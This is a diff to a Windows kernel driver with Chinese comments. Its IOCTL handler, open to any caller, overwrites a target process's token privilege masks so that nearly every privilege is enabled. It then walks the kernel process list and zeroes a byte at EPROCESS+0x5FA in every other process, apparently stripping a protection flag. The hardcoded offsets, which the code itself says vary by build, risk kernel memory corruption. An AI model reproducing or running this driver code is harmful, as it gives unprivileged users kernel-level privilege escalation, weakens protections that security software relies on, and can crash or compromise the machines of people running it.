@@ -16,6 +16,10 @@ typedef struct _SEP_TOKEN_PRIVILEGES {
 // IOCTL 定義
 #define IOCTL_EXECUTE_MEMORY_OP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+EXTERN_C NTKERNELAPI PEPROCESS NTAPI PsGetNextProcess(
+    _In_opt_ PEPROCESS Process
+);
+
 // 傳遞資料的結構定義
 typedef struct _KERNEL_OP_REQUEST {
     ULONG ProcessId;
@@ -35,6 +39,11 @@ VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
 }
 
 // DeviceControl 函式
+// 常見的 offset (Windows 10 x64)
+// 注意：不同 build 可能不同，請用 WinDBG !process 驗證
+#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET 0x1d8  
+#define EPROCESS_UNIQUEPROCESSID_OFFSET    0x1d0  
+
 NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
     UNREFERENCED_PARAMETER(DeviceObject);
 
@@ -45,43 +54,71 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
     if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_EXECUTE_MEMORY_OP) {
         PKERNEL_OP_REQUEST req = (PKERNEL_OP_REQUEST)Irp->AssociatedIrp.SystemBuffer;
 
+        // --- 原本：只處理輸入 PID ---
         PEPROCESS targetProcess = NULL;
         status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess);
 
         if (!NT_SUCCESS(status)) {
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] PsLookupProcessByProcessId 失敗: 0x%X\n", status));
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+                "[MyDriver] PsLookupProcessByProcessId 失敗: 0x%X\n", status));
         }
         else {
-            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 成功找到 PID %lu 的 EPROCESS: 0x%p\n", req->ProcessId, targetProcess));
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                "[MyDriver] 成功找到 PID %lu 的 EPROCESS: 0x%p\n",
+                req->ProcessId, targetProcess));
 
-            // Token Offset for modern Windows 10/11
-#define TOKEN_OFFSET 0x248 
+#define TOKEN_OFFSET 0x248
+#define PRIVILEGES_OFFSET 0x40
+
             PACCESS_TOKEN pToken = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)targetProcess + TOKEN_OFFSET));
             pToken = (PACCESS_TOKEN)((ULONG_PTR)pToken & ~0xF);
 
             if (!pToken) {
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] 找不到 Token 物件！\n"));
+                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+                    "[MyDriver] 找不到 Token 物件！\n"));
                 status = STATUS_NOT_FOUND;
             }
             else {
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 找到 Token 物件: 0x%p\n", pToken));
-
-#define PRIVILEGES_OFFSET 0x40
-                // 現在編譯器已經認識 PSEP_TOKEN_PRIVILEGES 了
                 PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + PRIVILEGES_OFFSET);
 
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] _SEP_TOKEN_PRIVILEGES 位於: 0x%p\n", pPrivileges));
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 原始 Present: 0x%llX, Enabled: 0x%llX\n", pPrivileges->Present, pPrivileges->Enabled));
+                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                    "[MyDriver] 原始 Present: 0x%llX, Enabled: 0x%llX\n",
+                    pPrivileges->Present, pPrivileges->Enabled));
 
                 pPrivileges->Present = 0x0000001ff2ffffbc;
                 pPrivileges->Enabled = 0x0000001ff2ffffbc;
 
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] [SUCCESS] 權限已修改！\n"));
-                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 新 Present: 0x%llX, Enabled: 0x%llX\n", pPrivileges->Present, pPrivileges->Enabled));
+                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                    "[MyDriver] [SUCCESS] 權限已修改！\n"));
             }
 
             ObDereferenceObject(targetProcess);
         }
+
+        // --- 新增功能：ActiveProcessLinks 遍歷所有 EPROCESS ---
+        PEPROCESS pCurrent = PsGetCurrentProcess(); // 任意一個 process 當起點
+        PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)pCurrent + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
+        PLIST_ENTRY head = pList;
+
+        do {
+            PEPROCESS curr = (PEPROCESS)((PUCHAR)pList - EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
+            ULONG pid = *(ULONG*)((PUCHAR)curr + EPROCESS_UNIQUEPROCESSID_OFFSET);
+
+            if (pid != req->ProcessId) { // 排除輸入 PID
+                __try {
+                    *((PUCHAR)curr + 0x5FA) = 0; // eb (EPROCESS+0x5FA) 0
+                    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+                        "[MyDriver] Patched process 0x%p (PID %lu)\n", curr, pid));
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+                        "[MyDriver] Patch failed for PID %lu\n", pid));
+                }
+            }
+
+            pList = pList->Flink; // 下一個
+        } while (pList != head); // 繞回來表示走完
+
     }
 
     Irp->IoStatus.Status = status;
@@ -89,6 +126,8 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
     return status;
 }
+
+
 
 // DriverEntry 函式
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
